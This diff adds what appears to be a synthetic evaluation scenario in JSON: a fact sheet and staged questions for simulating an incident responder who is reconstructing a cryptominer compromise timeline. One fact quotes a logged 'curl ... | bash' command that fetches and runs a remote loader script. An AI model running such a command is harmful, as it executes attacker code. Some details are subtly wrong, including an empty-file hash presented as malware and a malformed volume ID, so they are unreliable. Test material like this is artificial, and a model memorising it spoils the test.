@@ -1,0 +1,376 @@
+{
+  "scenario_id": "cyber_incident_timeline_03",
+  "domain": "cybersecurity_incident_response",
+  "description": "A response lead is building a precise incident timeline from logs, ticket comments, chat messages, and human recollections to understand what happened first and which decisions followed from it.",
+  "user_profile": {
+    "persona": "38-year-old incident responder responsible for reconstructing events under pressure",
+    "context": "The tools captured a lot of detail, but not in one chronological narrative that people can rely on",
+    "communication_style": "Chronological and exacting, distrusts vague summaries"
+  },
+  "fact_sheet": [
+    {
+      "id": "F01",
+      "category": "Initial Alert",
+      "fact": "On 2024-08-15 at 02:17:45 UTC, Datadog alert #78119 triggered for 'CPU Utilization > 95% for 10m' on host 'zeus-db-prod-01'."
+    },
+    {
+      "id": "F02",
+      "category": "Personnel",
+      "fact": "Priya Sharma (psharma), the on-call SRE, was paged via PagerDuty for alert #78119 at 02:18:02 UTC."
+    },
+    {
+      "id": "F03",
+      "category": "Ticket Management",
+      "fact": "Jira ticket INC-2024-8814 was automatically created by the PagerDuty integration at 02:18:15 UTC and assigned to Priya Sharma."
+    },
+    {
+      "id": "F04",
+      "category": "System State",
+      "fact": "At 02:24:10 UTC, Priya Sharma identified a process named 'kworker_xmr' with PID 8812 consuming 98% CPU on 'zeus-db-prod-01' using the 'top' command."
+    },
+    {
+      "id": "F05",
+      "category": "Communication",
+      "fact": "At 02:28:00 UTC, Priya Sharma created the public Slack channel '#inc-zeus-db-cpu' and invited the SRE and Security distribution lists."
+    },
+    {
+      "id": "F06",
+      "category": "Log Analysis",
+      "fact": "At 02:35:50 UTC, Priya Sharma ran the Splunk query 'index=os host=\"zeus-db-prod-01\" process_name=\"kworker_xmr\"' which returned 0 results, indicating the process name was likely spoofed."
+    },
+    {
+      "id": "F07",
+      "category": "System State",
+      "fact": "The process with PID 8812 was determined to be running under the service account 'svc_deploy' at 02:41:00 UTC."
+    },
+    {
+      "id": "F08",
+      "category": "Log Analysis",
+      "fact": "A search of auth logs for user 'svc_deploy' revealed an anomalous SSH login at 01:55:13 UTC from IP address 10.80.5.22, the IP of host 'apollo-web-prod-03'."
+    },
+    {
+      "id": "F09",
+      "category": "Personnel",
+      "fact": "At 02:45:00 UTC, Priya Sharma escalated the incident to the on-call security analyst, Ben Carter (bcarter)."
+    },
+    {
+      "id": "F10",
+      "category": "Communication",
+      "fact": "Ben Carter joined the Slack channel '#inc-zeus-db-cpu' at 02:47:19 UTC and requested a memory dump of the affected host."
+    },
+    {
+      "id": "F11",
+      "category": "Log Analysis",
+      "fact": "At 03:05:21 UTC, Ben Carter found a log entry in `/var/log/bash_history` on 'zeus-db-prod-01' showing the command 'curl -s 198.51.100.55/loader.sh | bash' executed by 'svc_deploy'."
+    },
+    {
+      "id": "F12",
+      "category": "Containment Actions",
+      "fact": "At 03:15:00 UTC, a decision was made by Priya Sharma and Ben Carter to isolate host 'zeus-db-prod-01' from the production network."
+    },
+    {
+      "id": "F13",
+      "category": "Containment Actions",
+      "fact": "An AWS security group rule change was applied at 03:18:45 UTC, restricting all ingress and egress traffic for 'zeus-db-prod-01' (IP: 10.45.12.101) except for SSH from the bastion host (IP: 10.1.1.5)."
+    },
+    {
+      "id": "F14",
+      "category": "Personnel",
+      "fact": "Incident Response Lead Maria Flores (mflores) was briefed and officially assumed the role of Incident Commander at 03:30:00 UTC."
+    },
+    {
+      "id": "F15",
+      "category": "System State",
+      "fact": "A forensics image of the 'zeus-db-prod-01' EBS volume (vol-0a1b2c3d4e5f6g7h) was initiated at 03:40:15 UTC."
+    },
+    {
+      "id": "F16",
+      "category": "System State",
+      "fact": "The SHA256 hash of the downloaded binary '/tmp/.x' was calculated as e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855."
+    },
+    {
+      "id": "F17",
+      "category": "Threat Intelligence",
+      "fact": "At 03:55:00 UTC, the binary hash was submitted to VirusTotal and matched the signature 'Trojan.Linux.XMRig.v4'."
+    },
+    {
+      "id": "F18",
+      "category": "Containment Actions",
+      "fact": "At 04:10:00 UTC, the password for the 'svc_deploy' account was rotated and all active sessions were terminated."
+    },
+    {
+      "id": "F19",
+      "category": "Log Analysis",
+      "fact": "Netflow logs showed 'zeus-db-prod-01' communicating with command and control (C2) server IP 203.0.113.88 on port 4444 between 02:05:00 and 03:18:45 UTC."
+    },
+    {
+      "id": "F20",
+      "category": "Containment Actions",
+      "fact": "The C2 IP address 203.0.113.88 was blocked at the perimeter firewall for all outbound traffic at 04:25:00 UTC."
+    },
+    {
+      "id": "F21",
+      "category": "Remediation",
+      "fact": "At 04:45:00 UTC, the team decided to rebuild 'zeus-db-prod-01' from a known-good AMI (ami-098765fedcba4321) and restore data from a database backup taken at 2024-08-15 01:00:00 UTC."
+    },
+    {
+      "id": "F22",
+      "category": "System State",
+      "fact": "The compromised web server 'apollo-web-prod-03' was found to be running an unpatched version of Apache Struts (2.5.20)."
+    },
+    {
+      "id": "F23",
+      "category": "Remediation",
+      "fact": "The new database instance, 'zeus-db-prod-01b', was deployed and passed all health checks at 06:30:00 UTC."
+    },
+    {
+      "id": "F24",
+      "category": "Remediation",
+      "fact": "Production traffic was fully routed to 'zeus-db-prod-01b' at 06:45:10 UTC, and the compromised instance 'zeus-db-prod-01' was terminated."
+    },
+    {
+      "id": "F25",
+      "category": "Ticket Management",
+      "fact": "At 07:00:00 UTC, Maria Flores updated the status of Jira ticket INC-2024-8814 to 'Resolved'."
+    },
+    {
+      "id": "F26",
+      "category": "Communication",
+      "fact": "A post-mortem meeting for INC-2024-8814 was scheduled via Google Calendar for 2024-08-17 at 14:00:00 UTC."
+    },
+    {
+      "id": "F27",
+      "category": "Log Analysis",
+      "fact": "The investigation concluded that the anomalous SSH login from host 'apollo-web-prod-03' to 'zeus-db-prod-01' using the service account 'svc_deploy' at 01:55:13 UTC was the initial access event that preceded the malicious downloader execution and later C2 traffic."
+    },
+    {
+      "id": "F28",
+      "category": "Containment Actions",
+      "fact": "Additional containment actions taken during the incident included isolating 'zeus-db-prod-01' from the production network at 03:18:45 UTC and blocking outbound traffic to the C2 IP address 203.0.113.88 at the perimeter firewall at 04:25:00 UTC."
+    },
+    {
+      "id": "F29",
+      "category": "Containment Actions",
+      "fact": "The full set of containment actions taken for the compromised service account 'svc_deploy' and the affected host 'zeus-db-prod-01' was: isolate 'zeus-db-prod-01' from the production network via AWS security group restrictions, rotate the password for 'svc_deploy', terminate all active 'svc_deploy' sessions, and block outbound traffic to the C2 IP address 203.0.113.88 at the perimeter firewall; no other containment actions for that host or service account were recorded in the incident timeline."
+    }
+  ],
+  "user_needs": [
+    {
+      "id": "N1",
+      "description": "What was the initial alert that triggered this incident, and when did it fire?",
+      "level": "must-have",
+      "key_fact_ids": [
+        "F01"
+      ],
+      "predictable_after": null,
+      "prediction_reason": null,
+      "turn_order": 1,
+      "reveal_group": "G1",
+      "reveal_group_label": "Incident Start",
+      "reveal_priority": 1
+    },
+    {
+      "id": "N2",
+      "description": "Who was paged for the alert and when was the incident ticket created?",
+      "level": "must-have",
+      "key_fact_ids": [
+        "F02",
+        "F03"
+      ],
+      "predictable_after": "N1",
+      "prediction_reason": "After learning about the alert, the next logical step is to understand the immediate human response and ticketing.",
+      "turn_order": 2,
+      "reveal_group": "G1",
+      "reveal_group_label": "Incident Start",
+      "reveal_priority": 2
+    },
+    {
+      "id": "N3",
+      "description": "What was the first diagnostic finding by the on-call SRE on the affected host?",
+      "level": "must-have",
+      "key_fact_ids": [
+        "F04"
+      ],
+      "predictable_after": null,
+      "prediction_reason": null,
+      "turn_order": 3,
+      "reveal_group": "G2",
+      "reveal_group_label": "Initial Investigation",
+      "reveal_priority": 1
+    },
+    {
+      "id": "N4",
+      "description": "What user account was the suspicious process running under?",
+      "level": "must-have",
+      "key_fact_ids": [
+        "F07"
+      ],
+      "predictable_after": "N3",
+      "prediction_reason": "Identifying the anomalous process naturally leads to asking about its execution context, specifically the user account.",
+      "turn_order": 4,
+      "reveal_group": "G2",
+      "reveal_group_label": "Initial Investigation",
+      "reveal_priority": 2
+    },
+    {
+      "id": "N5",
+      "description": "How did the attacker gain initial access to the database server, and what evidence confirmed that this was the initial access vector?",
+      "level": "must-have",
+      "key_fact_ids": [
+        "F08",
+        "F27"
+      ],
+      "predictable_after": "N4",
+      "prediction_reason": "CROSS-GROUP: Once the compromised user account is known, the immediate next question in the investigation is to determine the initial access vector for that account.",
+      "turn_order": 5,
+      "reveal_group": "G3",
+      "reveal_group_label": "Root Cause",
+      "reveal_priority": 1
+    },
+    {
+      "id": "N6",
+      "description": "When was the decision made to isolate the host and what specific network change was applied?",
+      "level": "must-have",
+      "key_fact_ids": [
+        "F12",
+        "F13"
+      ],
+      "predictable_after": null,
+      "prediction_reason": null,
+      "turn_order": 6,
+      "reveal_group": "G4",
+      "reveal_group_label": "Containment Actions",
+      "reveal_priority": 1
+    },
+    {
+      "id": "N7",
+      "description": "What containment actions were taken for the compromised service account and the affected host?",
+      "level": "must-have",
+      "key_fact_ids": [
+        "F29"
+      ],
+      "predictable_after": "N6",
+      "prediction_reason": "After learning about the primary containment action (network isolation), a natural follow-up is to ask about other containment steps, such as for the compromised credential.",
+      "turn_order": 7,
+      "reveal_group": "G4",
+      "reveal_group_label": "Containment Actions",
+      "reveal_priority": 2
+    },
+    {
+      "id": "N8",
+      "description": "What was the malware identified as based on its hash?",
+      "level": "must-have",
+      "key_fact_ids": [
+        "F16",
+        "F17"
+      ],
+      "predictable_after": "N5",
+      "prediction_reason": "CROSS-GROUP: After establishing the root cause (initial access), a key investigative thread is to identify the specific threat/malware involved.",
+      "turn_order": 8,
+      "reveal_group": "G5",
+      "reveal_group_label": "Threat Intelligence",
+      "reveal_priority": 1
+    },
+    {
+      "id": "N9",
+      "description": "What was the plan for rebuilding the compromised host?",
+      "level": "nice-to-have",
+      "key_fact_ids": [
+        "F21"
+      ],
+      "predictable_after": "N7",
+      "prediction_reason": "CROSS-GROUP: Once all containment actions are understood, the focus shifts to recovery, making the remediation plan the next logical topic.",
+      "turn_order": 9,
+      "reveal_group": "G6",
+      "reveal_group_label": "Remediation Plan",
+      "reveal_priority": 1
+    },
+    {
+      "id": "N10",
+      "description": "When was the post-mortem meeting for INC-2024-8814 scheduled?",
+      "level": "nice-to-have",
+      "key_fact_ids": [
+        "F26"
+      ],
+      "predictable_after": null,
+      "prediction_reason": null,
+      "turn_order": 10,
+      "reveal_group": "G7",
+      "reveal_group_label": "Post-Mortem",
+      "reveal_priority": 1
+    }
+  ],
+  "reveal_groups": [
+    {
+      "group_id": "G1",
+      "label": "Incident Start",
+      "member_need_ids": [
+        "N1",
+        "N2"
+      ],
+      "trigger_after": null
+    },
+    {
+      "group_id": "G2",
+      "label": "Initial Investigation",
+      "member_need_ids": [
+        "N3",
+        "N4"
+      ],
+      "trigger_after": null
+    },
+    {
+      "group_id": "G3",
+      "label": "Root Cause",
+      "member_need_ids": [
+        "N5"
+      ],
+      "trigger_after": "G2"
+    },
+    {
+      "group_id": "G4",
+      "label": "Containment Actions",
+      "member_need_ids": [
+        "N6",
+        "N7"
+      ],
+      "trigger_after": null
+    },
+    {
+      "group_id": "G5",
+      "label": "Threat Intelligence",
+      "member_need_ids": [
+        "N8"
+      ],
+      "trigger_after": "G3"
+    },
+    {
+      "group_id": "G6",
+      "label": "Remediation Plan",
+      "member_need_ids": [
+        "N9"
+      ],
+      "trigger_after": "G4"
+    },
+    {
+      "group_id": "G7",
+      "label": "Post-Mortem",
+      "member_need_ids": [
+        "N10"
+      ],
+      "trigger_after": null
+    }
+  ],
+  "simulator_config": {
+    "need_reveal_strategy": "grouped",
+    "patience": "medium",
+    "max_turns": 10
+  },
+  "metadata": {
+    "seed_id": "cyber_incident_timeline_03",
+    "variant": null,
+    "generated_by": "gemini-2.5-pro",
+    "reviewed": false,
+    "review_status": null
+  }
+}
